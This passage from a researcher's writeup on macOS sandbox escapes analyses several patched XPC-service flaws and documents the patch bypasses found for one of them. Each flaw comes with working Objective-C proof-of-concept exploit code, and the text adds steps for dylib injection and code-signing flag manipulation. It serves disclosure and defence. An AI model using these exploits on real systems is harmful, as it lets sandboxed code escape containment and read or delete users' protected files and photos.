<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020111428188.png" alt="image-20241020111428188"></p>

<p>The <code>AudioAnalyticsHelperServiceProtocol</code> has two methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020111649270.png" alt="image-20241020111649270"></p>

<p>The issue exists in the second XPC method “<code>createZipAtPath:hourThreshold:withReply:</code>”. The following is pseudo-code from the Objective-c class <code>AudioAnalyticsHelperService</code>:</p>

<div><pre><code>// reversed from the Objective-c class AudioAnalyticsHelperService

-(void) createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply {
    NSString *compressPath = [path stringByAppendingPathComponent:@"compressed"];
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:compressPath]) {
        [fm createDirectoryAtPath:compressPath withIntermediateDirectories:YES attributes:nil error:nil];
    }
    
    for (NSString *item in [fm contentsOfDirectoryAtPath:path error:nil]) {
        if ([[item pathExtension] isEqualToString:@"json"]) {// &amp;&amp; the file creation date meets the requirement
            NSString *srcPath = [path stringByAppendingPathComponent:item];
            NSString *dstPath = [compressPath stringByAppendingPathComponent:item];
            [fm moveItemAtPath:srcPath toPath:dstPath error:nil];
        }
    }
    
    NSString *zipPath = [path stringByAppendingPathComponent:[NSString stringWithFormat:@"audio_analytics_reporting_%@.zip", [self nowTimeString]]];
    [self createZipArchiveForURL:[NSURL fileURLWithPath:compressPath] destinationURL:[NSURL fileURLWithPath:zipPath]];
}
</code></pre></div>

<p>As we can see here, it helps to compress an arbitrary path that is specified by the XPC client.</p>

<p>It first creates a folder named <code>compressed</code> in the specified path, if the path does not exist. It then enumerates the files in the specified path with the <code>json</code> suffix and moves them to the <code>compressed</code> folder. In the file move operation, an attacker can move an arbitrary file to an arbitrary location by replacing the <code>compressed</code> folder with a symlink. The source file content is not checked, but the destination file path must have the suffix <code>json</code>.</p>

<p>Finally, it creates a zip file from the <code>compressed</code> folder.</p>

<p>Note that the <strong>newly generated zip file will not be quarantined</strong> because the XPC service itself is not sandboxed at all.</p>

<h3 id="the-exploit-and-demo-1">The exploit and demo</h3>

<div><pre><code>@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@"======== preparing payload at the current path:%@", currentPath);
    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @"zip"]) {
                // open the zip
                NSString *cmd = [@"open " stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
</code></pre></div>

<p>Demo link: https://youtu.be/7zd2Lun5r2s</p>

<h3 id="the-patch-1">The patch</h3>

<p>Apple quickly addressed the vulnerability prior to releasing macOS Sonoma 14.0 by checking the entitlement “<strong>com.apple.audioanalytics.helper.service</strong>” from the incoming XPC client:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020112102296.png" alt="image-20241020112102296"></p>

<p>If the client doesn’t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly.</p>

<p>Now in the latest macOS, the private <code>AudioAnalyticsInternal.framework</code> and the XPC service have been removed completely.</p>

<h2 id="cve-2023-27944">CVE-2023-27944</h2>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172639306.png" alt="image-20241019172639306"></p>

<h3 id="the-issue-2">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/TrialServer.framework/XPCServices/TrialArchivingService.xpc
</code></pre></div>

<p>This XPC service will enter the <strong>Service Sandbox</strong> by using the sandbox profile <code>/System/Library/Sandbox/Profiles/com.apple.trial.TrialArchivingService.sb</code>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020113955167.png" alt="image-20241020113955167"></p>

<p>However, the dropped files will not be quarantined.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020112619070.png" alt="image-20241020112619070"></p>

<p>The <code>TrialArchivingServiceProtocol</code> has four methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020112735952.png" alt="image-20241020112735952"></p>

<p>The issue exists in the XPC method “<code>extractArchiveFromHandle:withArchiveName:toDirectory:destDirExtension:postExtractionCompression:completion:</code>”.</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020112903145.png" alt="image-20241020112903145"></p>

<p>It helps to extract an archive file passed from a sandboxed application to a specified location. However, it <strong>doesn’t pass the quarantine extended attribute to the extracted content</strong>.</p>

<h3 id="the-exploit-and-demo-2">The exploit and demo</h3>

<p>There is a small challenge to exploit the issue.</p>

<p>By abusing the XPC method, the macho file in the archive will lose the <strong>executable (X)</strong> permission after the extraction. So the extracted application cannot be launched directly. Then I came up with a similar vulnerability to overcome this challenge: <a href="https://breakpoint.sh/posts/bypassing-the-macos-gatekeeper">CVE-2021-30990</a> can be exploited not only to bypass the gatekeeper, but also to escape the application sandbox. The trick to that exploit is to use symlink rather than the macho file itself.</p>

<p>Then I encountered another new challenge:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020113237752.png" alt="image-20241020113237752"></p>

<p>This XPC method only supports to extract <strong>directories</strong> and <strong>regular files</strong>, and does not allow extracting <strong>symlink</strong> from the archive.</p>

<p>To overcome the new challenge, I extract the payload application to the sandboxed <strong>app container path</strong>, where the sandboxed app has the read and write permission. (Luckily, the service sandbox profile is not too strict here.) Next, I can create the symlink from the sandboxed application directly, or just assign the executable permission to the extracted macho by calling the API <code>chmod</code>.</p>

<p>(Another simple solution is to archive the payload application twice. Abusing the vulnerable XPC method to unpack the external zip file and then using the system <code>open</code> command to unpack the inner zip file.)</p>

<p>The exploit code is as follows:</p>

<div><pre><code>@protocol TrialArchivingServiceProtocol &lt;NSObject&gt;
- (void) extractArchiveFromHandle:(NSFileHandle *)archiveHandle withArchiveName:(NSString *)archiveName toDirectory:(NSURL *)dstURL destDirExtension:(NSString *)destDirToken postExtractionCompression:(unsigned long long)post completion:(void (^)(unsigned char))reply;
@end

void exploit_TrialArchivingService(void) {
    [[NSBundle bundleWithURL:[NSURL fileURLWithPath:@"/System/Library/PrivateFrameworks/TrialServer.framework"]] load];
    NSXPCConnection *connection = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.trial.TrialArchivingService"];
    connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(TrialArchivingServiceProtocol)];
    [connection resume];
    // archive file handle
    NSURL *payload = [[NSBundle mainBundle] URLForResource:@"sbx.app" withExtension:@"zip"];
    NSFileHandle *archiveHandle = [NSFileHandle fileHandleForReadingAtPath:[payload path]];
    // destination directory
    NSString *dstPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Trial/v0/AssetStore"];
    [[NSFileManager defaultManager]createDirectoryAtPath:dstPath withIntermediateDirectories:YES attributes:0 error:0];
    NSURL *dstURL = [NSURL fileURLWithPath:dstPath];
    // destination directory sandbox extension
    typedef const char *(*PFN)(const char *extension_class, const char *path, uint32_t flags);
    void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
    PFN sandbox_extension_issue_file = (PFN)dlsym(h, "sandbox_extension_issue_file");
    const char *token = sandbox_extension_issue_file("com.apple.app-sandbox.read-write", [dstPath UTF8String], 2);
    // fire the hole, it will extract the archive file bundle to this App container, without the quarantine extended attribute
    __block dispatch_semaphore_t done = dispatch_semaphore_create(0);
    [connection.remoteObjectProxy extractArchiveFromHandle:archiveHandle withArchiveName:@"exploit" toDirectory:dstURL destDirExtension:[NSString stringWithUTF8String:token] postExtractionCompression:0 completion:^(unsigned char ret) {
        NSLog(@"ret:%d", ret);
        dispatch_semaphore_signal(done);
    }];
    dispatch_semaphore_wait(done, DISPATCH_TIME_FOREVER);
    // However, this extraction will drop the executable (X) permission. Create a symlink as a workaround
    NSString *target = [dstPath stringByAppendingPathComponent:@"sbx.app/Contents/MacOS/Automator Application Stub"];
    symlink("/System/Library/CoreServices/Automator Application Stub.app/Contents/MacOS/Automator Application Stub", [target UTF8String]);
    NSString *openCmd = [NSString stringWithFormat:@"open %@/sbx.app", dstPath];
    system([openCmd UTF8String]);
}
</code></pre></div>

<p>Demo link: https://youtu.be/VbqGbxmSLoA</p>

<h3 id="the-patch-2">The patch</h3>

<p>Apple addressed the vulnerability in macOS Ventura 13.3 by checking the entitlement “<strong>com.apple.TrialArchivingService.internal</strong>” from the incoming XPC client:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020145445876.png" alt="image-20241020145445876"></p>

<p>If the client doesn’t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly.</p>

<h2 id="cve-2023-32414">CVE-2023-32414</h2>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172718969.png" alt="image-20241019172718969"></p>

<h3 id="the-issue-3">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/DesktopServicesPriv.framework/XPCServices/ArchiveService.xpc
</code></pre></div>

<p>This XPC service will enter the service sandbox by using a sandbox profile, but the <strong>dropped files will not be quarantined</strong>.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020145606528.png" alt="image-20241020145606528"></p>

<p>The <code>DSArchiveServiceProtocolInternal</code> has five methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020145705526.png" alt="image-20241020145705526"></p>

<p>The issue exists in the XPC method “<code>unarchiveItemWithURLWrapper:…</code>”:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020145834370.png" alt="image-20241020145834370"></p>

<p>This XPC method helps to unarchive an item passed from a sandboxed application to a specified location. However, it doesn’t pass the quarantine extended attribute to the extracted content. Therefore, a sandboxed application can drop arbitrary files without being marked as quarantined by abusing this XPC method.</p>

<h3 id="the-exploit-and-demo-3">The exploit and demo</h3>

<p>The XPC client has already been implemented in the Objective-c class <code>DSArchiveService</code> within the <code>DesktopServicesPriv.framework</code>. The exploit code is as follows:</p>

<div><pre><code>@interface DSArchiveService : NSObject
- (void)unarchiveItemAtURL:(id) itemURL passphrase:(id) password destinationFolderURL:(id) dstURL completionHandler:(void (^)(NSURL *, NSError *))arg2;
@end

void prepare(void) {
    NSLog(@"preparing %@/payload.zip", NSHomeDirectory());
    system("mkdir -p poc.app/Contents/MacOS; mkdir dst");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x poc.app/Contents/MacOS/poc; zip -r payload.zip poc.app");
}

void exploit_ArchiveService(void) {
    [[NSBundle bundleWithURL:[NSURL fileURLWithPath:@"/System/Library/PrivateFrameworks/DesktopServicesPriv.framework"]] load];
    DSArchiveService *service = [[objc_getClass("DSArchiveService") alloc]init];
    
    NSString *payloadPath = [NSHomeDirectory() stringByAppendingPathComponent:@"payload.zip"];
    NSString *dstPath = [NSHomeDirectory() stringByAppendingPathComponent:@"dst"];
    [service unarchiveItemAtURL:[NSURL fileURLWithPath:payloadPath] passphrase:nil destinationFolderURL:[NSURL fileURLWithPath:dstPath] completionHandler:^(NSURL *dstFolder, NSError *error) {
        NSLog(@"dstFolderURL:%@, error:%@", dstFolder, error);
        NSString *cmd = [NSString stringWithFormat:@"open %@/poc.app", [dstFolder path]];
        system([cmd UTF8String]);
    }];
}
</code></pre></div>

<p>Demo link: https://youtu.be/RMyKyHYibSk</p>

<h3 id="the-patch-3">The patch</h3>

<p>Apple addressed the vulnerability in macOS Ventura 13.4 by checking the entitlement “<strong>com.apple.private.ArchiveService.XPC</strong>” from the incoming XPC client:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020150402830.png" alt="image-20241020150402830"></p>

<p>If the client doesn’t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly.</p>

<h2 id="cve-2023-32404">CVE-2023-32404</h2>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172755928.png" alt="image-20241019172755928"></p>

<h3 id="the-issue-4">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc
</code></pre></div>

<p>The XPC service can be launched without any sandbox restrictions. So it can be exploited to escape the application sandbox.</p>

<p>Moreover, it also has the special TCC entitlement in its code signature for <strong>Full Disk Access</strong>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020150516910.png" alt="image-20241020150516910"></p>

<p>Therefore, it can also be exploited to bypass the TCC protection completely!</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020150601039.png" alt="image-20241020150601039"></p>

<p>The <code>WFFileAccessHelperProtocol</code> has only one method <code>extendAccessToURL:completion:</code>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020150641370.png" alt="image-20241020150641370"></p>

<p>The only XPC method is designed to grant the read and write permission of an arbitrary URL to the XPC client:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020150711811.png" alt="image-20241020150711811"></p>

<p>Internally, it calls the API <code>sandbox_extension_issue_file</code> to issue the file access token.</p>

<p>The arbitrary URL is specified from the sandboxed XPC client.</p>

<h3 id="the-exploit-and-demo-4">The exploit and demo</h3>

<div><pre><code>@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
        else {
            NSLog(@"Got the file R&amp;W permission with sandbox token:%@", sbxToken);
            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
</code></pre></div>

<p>Demo link: https://youtu.be/5FVDe8Le1pw</p>

<h3 id="the-patch-4">The patch</h3>

<p>Apple addressed the vulnerability in macOS Ventura 13.4 by checking the entitlement “<strong>com.apple.shortcuts.file-access-helper</strong>” from the incoming XPC client:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151017457.png" alt="image-20241020151017457"></p>

<p>If the client doesn’t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly.</p>

<h2 id="cve-2023-41077">CVE-2023-41077</h2>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172822557.png" alt="image-20241019172822557"></p>

<h3 id="the-issue-5">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/Frameworks/ImageCaptureCore.framework/XPCServices/mscamerad-xpc.xpc
</code></pre></div>

<p>Similarly, the XPC service can be launched without any sandbox restrictions. So it can be exploited to escape the application sandbox.</p>

<p>What’s more, it has the special TCC entitlement in its code signature to access the <strong>Photos</strong> and <strong>Removable Volumes</strong> directly without prompting the users:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151150288.png" alt="image-20241020151150288"></p>

<p>Therefore, it can also be exploited to bypass these TCC protections at the same time!</p>

<p>The main logic is to listen at the service named “<strong>com.apple.mscamerad-xpc</strong>”.</p>

<p>Similarly, this XPC service accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151313353.png" alt="image-20241020151313353"></p>

<p>The <code>ICXPCDeviceManagerProtocol</code> has six methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151341184.png" alt="image-20241020151341184"></p>

<p>Specially, the XPC method “<code>openDevice:withReply:</code>” is designed to open and construct a new <code>MSCameraDevice</code>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151437728.png" alt="image-20241020151437728"></p>

<p>During the initialization of the new device, it listens at another anonymous XPC service to provide some service routines for the new camera device:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151501301.png" alt="image-20241020151501301"></p>

<p>The anonymous XPC service accepts all the incoming XPC clients by returning YES in the camera device’s delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151531992.png" alt="image-20241020151531992"></p>

<p>The <code>ICCameraDeviceProtocol</code> has 23 methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151608007.png" alt="image-20241020151608007"></p>

<p>The issue exists in the XPC method “<code>requestReadDataFromObjectHandle:options:withReply:</code>”:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151651506.png" alt="image-20241020151651506"></p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020151705732.png" alt="image-20241020151705732"></p>

<p>It reads the file content for the requested file item and replies the file content data to the XPC client. The requested file path is controlled from the XPC client. So a sandboxed application can exploit this XPC method to read an arbitrary file outside of the sandbox container.</p>

<p>At the same time, the sandboxed app can also read the user’s <strong>Photos</strong> directly without prompting the users due to the service’s powerful TCC entitlements.</p>

<h3 id="the-exploit-and-demo-5">The exploit and demo</h3>

<p>In order to trigger the vulnerability, we need to prepare the camera device and the camera file.</p>

<p>Through my research, I discovered that the <strong>MSCameraDevice</strong> can be emulated by creating a DMG file and mounting it.</p>

<p>Next, if a file path in the DMG volume matches the special <strong>regular expression</strong>, then the file item will be indexed as an <strong>ICCameraFile</strong> and the file data can be requested via the vulnerable XPC method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152029416.png" alt="image-20241020152029416"></p>

<div><pre><code>folderNameRegex = [NSRegularExpression regularExpressionWithPattern:@"^([1-9]{1}[\\d]{2}[\\w]{5})$|^((?i)\\bDCIM\\b)$" options:16 error:0];// e.g. 123abcde, DCIM, dcIm, ...
fileNameRegex = [NSRegularExpression regularExpressionWithPattern:@"^[\\w]{4}(E){0,1}(\\d){4}\\.(([\\w]){3}|HEIC)$" options:16 error:0];// e.g. abcd1234.mp3, 1234E5678.HEIC
</code></pre></div>

<p>So we can make a fake camera device and camera file like this:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152230512.png" alt="image-20241020152230512"></p>

<p>A sandboxed application could drop the DMG file and then open the DMG file to mount it to trigger the issue.</p>

<p>The XPC client has already been implemented in the ImageCaptureCore framework. The exploit code is as follows:</p>

<div><pre><code>@interface MyDeviceDelegate : NSObject&lt;ICCameraDeviceDelegate&gt;
@end
@implementation MyDeviceDelegate
- (void)cameraDevice:(ICCameraDevice *)camera didAddItems:(NSArray&lt;ICCameraItem *&gt; *)items { 
    NSLog(@"didAddItems");
    for (ICCameraFile *item in items) {
        NSLog(@"new file item:%@", item); // TODO: I should check the item type(file/folder) and item name here.
        [item requestReadDataAtOffset:0 length:item.fileSize completion:^(NSData *data, NSError *err) {
            NSLog(@"Got file data:%@ (%@)", data, [NSString stringWithCString:[data bytes] encoding:NSUTF8StringEncoding]);
        }];
    }
}
@end
@interface MyDeviceBrowserDelegate : NSObject&lt;ICDeviceBrowserDelegate&gt;
@end
@implementation MyDeviceBrowserDelegate
- (void)deviceBrowser:(ICDeviceBrowser *)browser didAddDevice:(ICDevice *)device moreComing:(BOOL)moreComing { 
    NSLog(@"didAddDevice:%@", device);
    device.delegate = devDelegate; // instance of MyDeviceDelegate
    [device requestOpenSession];
}
@end
void exploit(void) {
    ICDeviceBrowser *deviceBrowser = [[ICDeviceBrowser alloc]init];
    MyDeviceBrowserDelegate *browserDelegate = [[MyDeviceBrowserDelegate alloc]init];
    deviceBrowser.delegate = browserDelegate;
    [deviceBrowser start];
}
</code></pre></div>

<p>Demo link: https://youtu.be/bvJwne8b2g4</p>

<h3 id="the-patch-1">The patch 1</h3>

<p>Apple addressed the vulnerability in macOS Sonoma 14 by adding a new check in the function <code>acceptConnection:</code>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152404523.png" alt="image-20241020152404523"></p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152412462.png" alt="image-20241020152412462"></p>

<p>The check function returns <strong>OK</strong> if the incoming XPC client meets one of the following <strong>two conditions</strong>:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152502353.png" alt="image-20241020152502353"></p>

<ul>
  <li>Return OK if the client has the private entitlement: “<strong>com.apple.private.imagecapturecore.authorization_bypass</strong>”.</li>
  <li>Return OK <strong>if the client is a platform binary!</strong></li>
</ul>

<h3 id="the-bypass-1">The bypass 1</h3>

<p>The second condition doesn’t make any sense because the <strong>platform binary</strong> is not trustworthy and <strong>easy to inject</strong>! Then I reported the new issue to Apple. As a result, Apple assigned <strong>CVE-2024-23253</strong> to this bypass report:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020152721547.png" alt="image-20241020152721547"></p>

<p>Here’s how I bypassed the patch to access the TCC-protected contents:</p>

<ol>
  <li>Make a dylib from the previous old exploit code</li>
  <li>Choose a platform binary (It must be signed by Apple and has no entitlements. e.g., <code>/bin/ls</code>)</li>
  <li>Inject into the platform binary by using the environment variable <code>DYLD_INSERT_LIBRARIES</code></li>
  <li>Talk to the XPC service as before</li>
</ol>

<h3 id="the-patch-2">The patch 2</h3>

<p>Apple patched the issue again in macOS 14.4 by hardening the second condition:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153333113.png" alt="image-20241020153333113"></p>

<table>
  <tbody>
    <tr>
      <td>From the new patch code, we can see that it requires the XPC client to not only be the <strong>platform binary</strong>, but also to be signed with the flags: “**CS_REQUIRE_LV</td>
      <td>CS_FORCED_LV**”.</td>
    </tr>
  </tbody>
</table>

<h3 id="the-bypass-2">The bypass 2</h3>

<p>Apple thought that the new required flags would kill the dynamic library injection exploits. But they were wrong. The checks here can still be bypassed! Again, I reported the new bypass to Apple and they assigned the new CVE-2024-40831 for it:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153456843.png" alt="image-20241020153456843"></p>

<p>Here’s how I exploited it again:</p>

<ol>
  <li>Make a dylib from the previous old exploit code</li>
  <li>Choose a platform binary (It must be signed by Apple and has no entitlements. e.g., <code>/bin/ls</code>)</li>
  <li>Inject into the platform binary by using the environment variable <code>DYLD_INSERT_LIBRARIES</code></li>
  <li><strong>Set the required flags manually</strong></li>
  <li>Talk to the XPC service as before</li>
</ol>

<p>Compared to the previous exploit, only one additional step has been added. After injecting into the platform binary “<code>ls</code>” command, the exploit process doesn’t have the required flags. However, the desired flags can be set manually at runtime via the system API “<code>csops</code>”:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153657853.png" alt="image-20241020153657853"></p>

<p>As a result, the exploit process will bypass all the checks and talk to the XPC service as before!</p>

<h3 id="the-patch-3">The patch 3</h3>

<p>Apple patched this issue again in macOS Sequoia 15:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153742037.png" alt="image-20241020153742037"></p>

<p>Now, It will approve the XPC connection, only if the XPC client has the private entitlement: “<strong>com.apple.private.imagecapturecore.authorization_bypass</strong>”.</p>

<h2 id="cve-2023-42961">CVE-2023-42961</h2>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241019172851367.png" alt="image-20241019172851367"></p>

<p>Note that this vulnerability can also be exploited on <strong>iOS</strong>.</p>

<h3 id="the-issue-6">The issue</h3>

<p>The vulnerability exists in the XPC service:</p>

<div><pre><code>/System/Library/Frameworks/Intents.framework/XPCServices/intents_helper.xpc
</code></pre></div>

<p>The XPC service can be launched without any sandbox restrictions.</p>

<p>It accepts all the incoming XPC clients by returning <strong>YES</strong> in the delegate method:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153831152.png" alt="image-20241020153831152"></p>

<p>The <code>INHServing</code> protocol has 11 methods:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020153859143.png" alt="image-20241020153859143"></p>

<p>There is a path traversal issue in the function named “<code>filePathForImageWithFileName</code>”:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020154451538.png" alt="image-20241020154451538"></p>

<p>The function parameter <code>fileName</code> is an arbitrary string, that can be controlled by the XPC client.</p>

<p>This vulnerable function can be reached from two XPC methods:</p>

<p>The first XPC method is named “<code>retrieveImageWithIdentifier:completion:</code>”:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020154537678.png" alt="image-20241020154537678"></p>

<p>It can be abused to read an arbitrary file with extension “<code>.png</code>”, and the retrieved data will be stored in a member variable of the “<code>INImage</code>” instance and replied to the XPC client.</p>

<p>The second XPC method is named “<code>purgeImageWithIdentifier:completion:</code>”:</p>

<p><img src="https://jhftss.github.io/res/2024-11-7-A-New-Era-of-macOS-Sandbox-Escapes/image-20241020154636438.png" alt="image-20241020154636438"></p>

<p>It can be exploited to delete an arbitrary file path.</p>

<h3 id="the-exploit-and-demo-6">The exploit and demo</h3>

<div><pre><code>@protocol INHServing
- (oneway void)purgeImageWithIdentifier:(NSString *)arg1 completion:(void (^)(NSError *))arg2;
- (oneway void)retrieveImageWithIdentifier:(NSString *)arg1 completion:(void (^)(INImage *, NSError *))arg2;
@end

void exploit_intents_helper(NSString *target) {
